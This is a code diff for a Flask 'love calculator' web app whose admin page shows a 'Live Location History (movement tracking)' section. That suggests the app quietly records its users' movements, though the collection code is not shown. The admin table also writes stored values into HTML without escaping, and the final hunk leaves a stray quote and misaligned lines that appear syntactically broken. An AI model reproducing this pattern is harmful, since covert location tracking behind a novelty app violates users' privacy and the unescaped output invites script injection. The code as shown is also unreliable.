@@ -7,12 +7,12 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ---------- Supabase Setup ----------
+# ---------- Safe Supabase Setup ----------
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 
 if not SUPABASE_URL or not SUPABASE_KEY:
-    print("ERROR: Missing Supabase credentials", file=sys.stderr)
+    print("⚠️ Missing Supabase credentials. App will run without database.", file=sys.stderr)
     supabase = None
 else:
     supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
@@ -101,8 +101,7 @@ def get_love_message(name1, name2, percentage):
 @app.route('/')
 def index():
     # Read the HTML file from the static folder
-    import os
-    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    base_dir = os.path.dirname(os.path.abspath(__file__))
     html_path = os.path.join(base_dir, 'static', 'index.html')
     try:
         with open(html_path, 'r', encoding='utf-8') as f:
@@ -190,7 +189,7 @@ def admin():
                     else:
                         display_val = str(val)[:500]
                     html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
-                html += '</td>'
+                html += '</tr>'
             html += '</table></div>'
 
             html += '<hr><h2>📍 Live Location History (movement tracking)</h2>'
@@ -222,7 +221,7 @@ def admin():
 
 
 
-'   # (keep the HTML string properly)
+'
                     html += '</table>'
             return html
         else:
